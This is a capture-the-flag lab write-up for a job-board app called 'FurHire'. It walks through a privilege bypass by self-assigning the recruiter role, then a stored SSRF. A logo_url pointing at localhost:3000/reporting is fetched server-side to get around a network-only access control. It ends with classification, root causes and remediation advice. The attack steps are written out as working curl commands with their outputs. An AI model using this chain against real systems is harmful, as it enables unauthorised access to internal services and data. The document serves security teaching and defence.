---
title: FurHire - SSRF
tags:
  - bugforge
  - ssrf
  - access-control-bypass
  - weekly
---

- The challenge chains two steps: register as recruiter, then SSRF via `logo_url` to bypass access control on an internal-only reporting endpoint

## Setup

```bash
export TARGET="https://YOUR-LAB-URL.labs-app.bugforge.io"
```

## Enumeration

1. Tech Stack

- Express.js backend, JWT auth (HS256, no expiration)
- Two roles: `user` (job seeker) and `recruiter` (posts jobs, manages company)
- Same platform as the XSS challenge with identical endpoints

2. Key Endpoints

```
POST /api/register            - role=user|recruiter
POST /api/login               - JWT in response
GET  /api/profile             - Returns user + company data
PUT  /api/company             - Recruiter only (company_name, industry, location, website, logo_url, description)
GET  /api/jobs/:id            - Shows company info including logo_url
GET  /api/company/:id/logo    - SSRF TRIGGER - fetches stored logo_url server-side
GET  /reporting               - 403 "Access denied" from outside
```

3. The Target

```bash
curl -s $TARGET/reporting
```
```json
{"error":"Access denied"}
```

403 for every auth state - no token, user token, recruiter token. The access control is not role-based -- it's network-based (localhost only).

## Step 1: Register as Recruiter

The registration endpoint accepts a `role` field. Just register with `role=recruiter`:

```bash
curl -s $TARGET/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"recruiter1","email":"rec@test.com","full_name":"Recruiter","password":"Password123!","role":"recruiter"}'
```
```json
{
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "user": {"id":7, "username":"recruiter1", "role":"recruiter"},
  "needsOnboarding": true
}
```

Save the token:

```bash
export TOKEN="eyJhbGciOiJIUzI1NiIs..."
```

This unlocks `PUT /api/company` which lets us set a company logo URL.

## Step 2: Set Logo URL to Internal Reporting Endpoint

As recruiter, create the company profile with `logo_url` pointing to the internal reporting endpoint:

```bash
curl -s $TARGET/api/company \
  -X PUT \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"company_name":"Test Corp","industry":"Tech","location":"Remote","website":"https://example.com","logo_url":"http://localhost:3000/reporting","description":"Testing"}'
```
```json
{"message":"Company updated successfully"}
```

Verify it stored:

```bash
curl -s $TARGET/api/profile \
  -H "Authorization: Bearer $TOKEN" | jq .company.logo_url
```
```
"http://localhost:3000/reporting"
```

## Step 3: Trigger the SSRF

`GET /api/company/:id/logo` fetches the stored `logo_url` server-side and returns the content:

```bash
curl -s $TARGET/api/company/3/logo \
  -H "Authorization: Bearer $TOKEN" | jq .
```
```json
{
  "jobs": [
    {"id":5, "title":"Test Job", "status":"open", "location":"Remote"},
    {"id":1, "title":"Guard Dog Coordinator", "status":"open"},
    {"id":2, "title":"Senior Fetch Specialist", "status":"open"},
    {"id":3, "title":"Chief Mousing Officer", "status":"open"},
    {"id":4, "title":"Therapy Cat Lead", "status":"open"}
  ],
  "applications": [],
  "flag": "bug{...}"
}
```

The server fetched `http://localhost:3000/reporting` from its own loopback interface - bypassing the network-based access control.

> **Note:** Your company ID might differ. Check `curl -s $TARGET/api/profile -H "Authorization: Bearer $TOKEN" | jq .company.id` to get yours.

## What We Tested Along the Way

Before finding the trigger endpoint:

| Attempt | Result | Why |
|---------|--------|-----|
| Direct `/reporting` with various tokens | 403 always | Network-based ACL, not role-based |
| `/reporting` with X-Forwarded-For: 127.0.0.1 | 403 | App doesn't trust proxy headers |
| `PUT /api/company` with extra fields | 500 DB error | Extra columns break the query |
| `POST /api/company/validate-logo` | 404 | Doesn't exist |
| `GET /api/company/logo` | 404 | Wrong path |
| Checking profile/jobs for fetched content | Just stored raw URL | Not reflected in PUT response |
| `/api/reporting` | 404 | Correct path is `/reporting` (no /api prefix) |

The breakthrough was `GET /api/company/:id/logo` - a RESTful sub-resource path that makes semantic sense but isn't referenced anywhere in the frontend JS.

## Attack Chain

```
Register with role=recruiter
    |
    v
PUT /api/company with logo_url = http://localhost:3000/reporting
    |
    v
GET /api/company/:id/logo
    |
    v
Server fetches logo_url from localhost (bypasses network ACL)
    |
    v
/reporting content returned to attacker (jobs, applications, flag)
```

## Security Takeaways

### Vulnerability Classification

- OWASP Top 10: A10:2021 - Server-Side Request Forgery (SSRF)
- CWE: CWE-918 - Server-Side Request Forgery

### Impact

- Bypass of network-based access controls on internal endpoints
- Full read access to internal reporting data
- In production: potential access to internal services, cloud metadata, admin panels

### Root Causes

1. **No URL validation on logo_url** -- the server accepts and fetches arbitrary URLs without checking the destination
2. **Network-based ACL as sole protection** -- `/reporting` relies entirely on source IP, which SSRF trivially bypasses
3. **Unnecessary server-side fetch** -- the `/api/company/:id/logo` endpoint fetches and proxies the content instead of returning the URL for client-side rendering

### Remediation

- Validate and restrict `logo_url` to HTTPS URLs on public domains only
- Implement SSRF protection: blocklist private IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, ::1)
- Add authentication/authorization to `/reporting` rather than relying on network ACLs alone
- If logo proxying is needed, use a dedicated image proxy with strict Content-Type validation and size limits

### Key Lessons

1. **"Access denied" doesn't mean game over** -- network-based ACLs are bypassed by any SSRF in the same application. Always look for server-side fetch functionality when you see internal-only endpoints
2. **Undocumented endpoints exist** -- `/api/company/:id/logo` wasn't in any frontend JS or HTML. RESTful convention (noun/:id/sub-resource) helps guess these
3. **Stored vs reflected SSRF** -- the URL is stored first (PUT) and fetched separately (GET). This pattern is common in image upload, webhook, and avatar URL features
4. **Port matters** -- the internal app runs on port 3000 (Express default). Knowing the internal port is necessary to construct the SSRF URL
